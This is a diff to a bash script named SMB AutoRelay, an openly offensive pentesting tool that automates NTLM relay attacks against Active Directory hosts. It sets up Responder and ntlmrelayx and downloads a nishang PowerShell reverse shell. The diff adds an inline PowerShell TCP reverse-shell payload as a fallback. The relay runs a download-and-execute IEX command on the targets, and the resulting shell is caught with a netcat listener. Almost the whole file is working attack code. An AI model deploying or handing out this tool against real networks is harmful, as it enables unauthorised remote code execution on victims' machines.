@@ -1,16 +1,16 @@
 #!/bin/bash
 
-# Name: SMB Auto Relay
+# Name: SMB AutoRelay
 # Author: chesire
 # 
-# Description: SMB Auto Relay provides the automation of SMB/NTLM Relay technique for pentesting and red teaming exercises in active directory environments.
+# Description: SMB AutoRelay provides the automation of SMB/NTLM Relay technique for pentesting and red teaming exercises in active directory environments.
 # Usage: ./smbAutoRelay.sh -i <interface> -t <TargetsFilePath>
 # Example: ./smbAutoRelay -i eth0 -t ./targets.txt
 # Note: targets.txt only store a list of IP addresses that you want to perform the relay.
 #
 
 # ################## DISCLAIMER ##################
-# I AM NOT RESPONSIBLE OF TE MISUSE OF THIS TOOL.
+# I AM NOT RESPONSIBLE OF THE MISUSE OF THIS TOOL.
 # YOU RUN IT AT YOUR OWN RISK. PLEASE BE KIND :)
 
 #Colours
@@ -23,11 +23,13 @@ purpleColour="\e[0;35m\033[1m"
 turquoiseColour="\e[0;36m\033[1m"
 grayColour="\e[0;37m\033[1m"
 
-
 trap ctrl_c INT
 
 function ctrl_c(){
-	sleep 1; echo -e "${redColour}[D:]${endColour}Keyboard interruption detected! Exiting..."; tput cnorm; tmux kill-session -t 'smbautorelay*' &>/dev/null; exit 1
+	echo -e "\n${redColour}[D:]${endColour} Keyboard interruption detected! Exiting...";
+	tmux kill-session -t 'smbautorelay*' &>/dev/null
+	tput cnorm
+	exit 1
 }
 
 function banner(){
@@ -44,77 +46,98 @@ function banner(){
 
 function helpMenu(){
 	echo -e "${blueColour}Usage: ./smbAutoRelay.sh -i eth0 -t ./targets.txt${endColour}"
-	echo -e "\n\t${purpleColour}i) Interface to listen for SMB requests${endColour}"
+	echo -e "\n\t${purpleColour}i) Interface to listen for NetNTLM hashes${endColour}"
     echo -e "\n\t${purpleColour}t) File path to the list of targets${endColour}"
-    echo -e "\n\t${purpleColour}h) Shows this help menu${endColour}"
+    echo -e "\n\t${purpleColour}r) Remove all installed software${endColour}"
+	echo -e "\n\t${purpleColour}h) Shows this help menu${endColour}"
 	tput cnorm; exit 0
+}
+
+function checkApt(){
+	which $1 &>/dev/null
+	if [ $? -eq 0 ];then
+		echo -e "\t${greenColour}[:)]${endColour} $1 installed\n";sleep 1
+	else
+		echo -e "\t${yellowColour}[:S]${endColour} $1 not installed, installing..."; sleep 1
+		apt install -y $1 &>/dev/null
+		which $1 &>/dev/null
+		if [ $? -eq 0 ];then
+			echo -e "\t${greenColour}[:S]${endColour} $1 installed\n"; sleep 1
+            echo "$1" >> $(pwd)/unnistall.txt
+		else
+			echo -e "\t${redColour}[:S]${endColour} Something bad happened, $1 could not be installed. Exiting...\n"; sleep 1
+			exit 1
+		fi
+	fi
 }
 
 function checkProgramsNeeded(){
 
-    # ADD tmux rlwrap python python3 nc
+    programs=(tmux rlwrap python python3 netcat)
 
 	echo -e "${blueColour}[*]${endColour} Checking for dependencies needed...\n"; sleep 1
 	
-	which /opt/responder/Responder.py &>/dev/null
+    which $(pwd)/responder/Responder.py &>/dev/null
 	if [ $? -eq 0 ]; then
 		echo -e "\t${greenColour}[:)]${endColour} Responder installed\n"; sleep 1
 	else
-		echo -e "\t${yellowColour}[:S]${endColour} Responder not installed, installing in /opt/responder directory";sleep 1
-		mkdir /opt/responder; git clone https://github.com/lgandx/Responder.git /opt/responder &>/dev/null
-		if [ $? -eq 0 ]; then
-			chmod u+x /opt/responder/Responder.py
-			echo -e "#!/bin/bash\n\ncd /opt/responder/ && ./Responder.py \"\$@\"" > /usr/sbin/responder
-			echo -e "\t${greenColour}[:)]${endColour} Respoder installed sucessfully!\n"; sleep 1
-		else
-			echo -e "\t${redColour}[:S]${endColour} Something happened, responder could not be installed. Exiting...\n"; sleep 1
-			exit 1
+      echo -e "\t${yellowColour}[:S]${endColour} Responder not installed, installing in '$(pwd)/responder' directory";sleep 1
+      mkdir $(pwd)/responder; git clone https://github.com/lgandx/Responder.git $(pwd)/responder &>/dev/null
+      if [ $? -eq 0 ]; then
+        chmod u+x $(pwd)/responder/Responder.py
+        echo -e "\t${greenColour}[:)]${endColour} Respoder installed sucessfully!\n"; sleep 1
+        echo "responder" >> $(pwd)/unninstall.txt
+      else
+	    echo -e "\t${redColour}[:S]${endColour} Something bad happened, responder could not be installed. Exiting...\n"; sleep 1; exit 1
 		fi
 	fi
 
-	which /opt/ntlmrelayx.py &>/dev/null
+	which $(pwd)/ntlmrelayx.py &>/dev/null
 	if [ $? -eq 0 ]; then
 		echo -e "\t${greenColour}[:)]${endColour} ntlmrelayx.py installed\n";sleep 1
 	else
-		echo -e "\t${yellowColour}[:S]${endColour} ntlmrelayx.py not found, downloading in /opt directory\n"; sleep 1
-		wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ntlmrelayx.py -O /opt/ntlmrelayx.py &>/dev/null
-		/bin/ls /opt/ntlmrelayx.py &>/dev/null
+		echo -e "\t${yellowColour}[:S]${endColour} ntlmrelayx.py not found, downloading in $(pwd) directory"; sleep 1
+		wget "https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ntlmrelayx.py" -O "$(pwd)/ntlmrelayx.py" &>/dev/null
+        /bin/ls "$(pwd)/ntlmrelayx.py" &>/dev/null
 		if [ $? -eq 0 ]; then
-			chmod u+x /opt/ntlmrelayx.py
-			ln -f /opt/ntlmrelayx.py /usr/bin/ntlmrelayx.py
+			chmod u+x "$(pwd)/ntlmrelayx.py"
 			echo -e "\t${greenColour}[:)]${endColour} ntlmrelayx.py downloaded succesfully!\n"; sleep 1
+			echo "ntlmrelayx" >> unninstall.txt
 		else
-			echo -e "\t${redColour}[:S]${endColour} Something happened, ntlmrelayx.py could not be installed. Exiting...\n"; sleep 1
-			exit 1
+			echo -e "\t${redColour}[:S]${endColour} Something bad happened, ntlmrelayx.py could not be installed. Exiting...\n"; sleep 1; exit 1
 		fi
 	fi
+
+	for program in "${programs[@]}"; do
+		checkApt $program
+    done
 }
 
 function checkResponderConfig(){
 	echo -e "${blueColour}[*]${endColour} Checking responder config..."
 
-	SMBStatus=$(grep "^SMB" /opt/responder/Responder.conf | head -1 | awk '{print $3}')
-	HTTPStatus=$(grep -E "^HTTP" /opt/responder/Responder.conf | head -1 | awk '{print $3}')
+	SMBStatus=$(grep "^SMB" $(pwd)/responder/Responder.conf | head -1 | awk '{print $3}')
+	HTTPStatus=$(grep -E "^HTTP" $(pwd)/responder/Responder.conf | head -1 | awk '{print $3}')
 
-	/bin/ls /opt/responder/Responder.conf.old &>/dev/null
+	/bin/ls $(pwd)/responder/Responder.conf.old &>/dev/null
 	if [ $? -ne 0 ];then
-		echo -e "\t${blueColour}[*]${endColour} Making copy of original config file at /etc/responder/Responder.conf.old\n"; sleep 1
-		cp /opt/responder/Responder.conf /opt/responder/Responder.conf.old
+      echo -e "\n\t${blueColour}[*]${endColour} Making copy of original config file to $(pwd)/responder/Responder.conf.old\n"; sleep 1
+		cp $(pwd)/responder/Responder.conf $(pwd)/responder/Responder.conf.old
 	fi
 
 	if [ $SMBStatus == "On" ]; then
 		echo -e "\t${yellowColour}[:S]${endColour} Responder SMB server enabled, switching off..."; sleep 1
-		sed 's/SMB = On/SMB = Off/' /opt/responder/Responder.conf > /opt/responder/Responder.conf.tmp
-	    mv /opt/responder/Responder.conf.tmp /opt/responder/Responder.conf
-        rm -f /opt/responder/Responder.conf.tmp 
+		sed 's/SMB = On/SMB = Off/' $(pwd)/responder/Responder.conf > $(pwd)/responder/Responder.conf.tmp
+	    mv $(pwd)/responder/Responder.conf.tmp $(pwd)/responder/Responder.conf
+        rm -f $(pwd)/responder/Responder.conf.tmp 
 	fi
 
 	if [ $HTTPStatus == "On" ]; then
 		echo -e "\t${yellowColour}[:S]${endColour} Responder HTTP server enabled, switching off..."; sleep 1
-        which /opt/responder/Responder.conf.tmp &>/dev/null
-        sed 's/HTTP = On/HTTP = Off/' /opt/responder/Responder.conf > /opt/responder/Responder.conf.tmp
-	    mv /opt/responder/Responder.conf.tmp /opt/responder/Responder.conf
-        rm -f /opt/responder/Responder.conf.tmp
+        which $(pwd)/responder/Responder.conf.tmp &>/dev/null
+        sed 's/HTTP = On/HTTP = Off/' $(pwd)/responder/Responder.conf > $(pwd)/responder/Responder.conf.tmp
+	    mv $(pwd)/responder/Responder.conf.tmp $(pwd)/responder/Responder.conf
+        rm -f $(pwd)/responder/Responder.conf.tmp
 	fi
 
 	echo -e "\n\t${greenColour}[:)]${endColour} Responder SMB and HTTP servers disabled. Starting Relay Attack...\n"; sleep 1
@@ -130,7 +153,7 @@ function relayingAttack(){
   tmux rename-window "smbautorelay" && tmux split-window && tmux select-pane -t 1
 
   echo -e "${blueColour}[*]${endColour} Tmux setted up. Launching Responder...\n"; sleep 1
-  tmux send-keys "python3 /opt/responder/Responder.py -I eth0 -drw" C-m && sleep 0.5
+  tmux send-keys "python3 $(pwd)/responder/Responder.py -I eth0 -drw" C-m && sleep 0.5
 
   lhost=$(ifconfig $interface | grep "inet\s" | awk '{print $2}')
   lport=$(($RANDOM%65535))
@@ -141,17 +164,25 @@ function relayingAttack(){
     if [ $lport -ne $openPort ];then break; fi
   done
 
-  echo -e "${blueColour}[*]${endColour} Serving PowerShell payload at $lhost:8000...\n"
-  wget 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1' -O ./shell.ps1 &>/dev/null
-  echo 'Invoke-PowerShellTcp -Reverse -IPAddress '$lhost' -Port '$lport >> ./shell.ps1
+  echo -e "${blueColour}[*]${endColour} Downloading PowerShell payload from nishang repository...\n"; sleep 1
+  wget 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1' -O $(pwd)/shell.ps1 &>/dev/null
+  if [ ! -e "$(pwd)/shell.ps1" ];then
+   echo -e "${yellowColour}[:S]${endColour} Unable to get nishang payload. Let's try crafting it manually...\n"; sleep 1
+   rshell='$client = New-Object System.Net.Sockets.TCPClient("'$lhost'",'$lport');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+   echo $rshell > $(pwd)/shell.ps1
+  else
+    echo 'Invoke-PowerShellTcp -Reverse -IPAddress '$lhost' -Port '$lport >> $(pwd)/shell.ps1
+  fi
+
+  echo -e "${blueColour}[*]${endColour} Serving PowerShell payload at $lhost:8000...\n"; sleep 1
   tmux select-pane -t 2 && tmux send-keys "python3 -m http.server" C-m && sleep 0.5 && tmux split-window -h
 
   echo -e "${blueColour}[*]${endColour} Launching ntlmrelayx.py\n"; sleep 1
   command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
-  tmux select-pane -t 3 && tmux send-keys "python /opt/ntlmrelayx.py -tf $targets -smb2support -c \"$command\"" C-m && sleep 0.5
+  tmux select-pane -t 3 && tmux send-keys "python $(pwd)/ntlmrelayx.py -tf $targets -smb2support -c \"$command\"" C-m && sleep 0.5
 
 
-  echo -e "${blueColour}[*]${endColour} $lport port open to receive the connection\n"
+  echo -e "${blueColour}[*]${endColour} $lport port open to receive the connection\n"; sleep 1
   gnome-terminal --window --hide-menubar -e "rlwrap nc -lvvnp $lport" > /dev/null 2>&1 &
   gnome_nc_PID=$!
 
@@ -164,26 +195,62 @@ function relayingAttack(){
   done
 
   if [ "$portStatus" == "ESTABLISHED" ];then
-    echo -e "${greenColour}[:)]${endColour} Relay succesful! Enjoy your shell!\n"
+    echo -e "${greenColour}[:D]${endColour} Relay succesful! Enjoy your shell!\n"; sleep 1
   else
-    echo -e "${redColour}[:(]${endColour} Relay unsuccesful! May be you need more coffee\n"
+    echo -e "${redColour}[:(]${endColour} Relay unsuccessful! May be you need more coffee\n"; sleep 1
   fi
-  echo -e "${blueColour}[*]${endColour} Killing Tmux session: smbautorelay\n"
+  echo -e "${blueColour}[*]${endColour} Killing Tmux session: smbautorelay\n"; sleep 1
   tmux kill-session -t "smbautorelay*"
-  rm ./shell.ps1
+  rm -f $(pwd)/shell.ps1 &>/dev/null
 
+}
+
+function rmsw(){
+
+  if [ ! -e $(pwd)/unninstall.txt ];then
+    echo -e "${greenColour}[:)]${endcolour} Nothing to unninstall\n"
+    tput cnorm; exit 0
+  fi
+
+  echo -ne "${redColour}[!!]${endColour} Are you sure you want to unninstall $(cat $(pwd)/unninstall.txt | xargs | sed 's/ /, /g')? (y/n): "; read confirm
+
+  while [[ "$confirm" != "y" && "$confirm" != "n" ]];do
+    echo -ne "Please type y or n: ";read confirm
+  done
+
+  if [ "$confirm" == "y" ];then
+    echo -e "\n$yellowColour[!!]${endColour} Unninstalling process started, please do not stop the process...\n"; sleep 1
+    while read line; do
+      if [ "$line" == "responder" ];then
+        rm -rf $(pwd)/responder &>/dev/null
+      elif [ "$line" == "ntlmrelayx" ];then
+        rm -f $(pwd)/ntlmrelayx.py &>/dev/null
+      else
+        apt remove -y $line &>/dev/null
+      fi
+      if [ $? -ne 0 ];then
+        echo -e "\t${redColour}[D:]${endColour} Unable to unninstall $line. Try manually\n"; sleep 1
+      else
+        echo -e "\t${greenColour}[:)]${endColour} $line unninstaled\n"; sleep 1
+      fi
+    done < $(pwd)/unninstall.txt
+    rm -f $(pwd)/unninstall.txt
+    tput cnorm; exit 0
+  else
+    tput cnorm: exit 0
+  fi
 }
 
 # Main function
 banner
-if [ `id -u` == 0 ]; then 
+if [ "$(id -u)" == 0 ]; then 
 	tput civis
-	declare -i parameter_counter=0
 
-	while getopts ":i:t:h:" arg; do
+	declare -i parameter_counter=0; while getopts "ri:t:h" arg; do
 		case $arg in
-			i) interface=$OPTARG; let parameter_counter+=1;;
-			t) targets=$OPTARG; let parameter_counter+=1;;
+            r) rmsw;;
+			i) interface=$OPTARG; let parameter_counter+=1 ;;
+			t) targets=$OPTARG; let parameter_counter+=1 ;;
 			h) helpMenu;;
 		esac
 	done
@@ -203,8 +270,9 @@ if [ `id -u` == 0 ]; then
 		checkProgramsNeeded
 		checkResponderConfig
         relayingAttack
-		tput cnorm; exit 0
 	fi
+
+	tput cnorm; exit 0
 
 else
 	echo -e "\n${redColour}[!!] Super powers not activated!${endColour}\n${blueColour}[*] You need root privileges to run this tool!${endColour}"; tput cnorm; exit 1
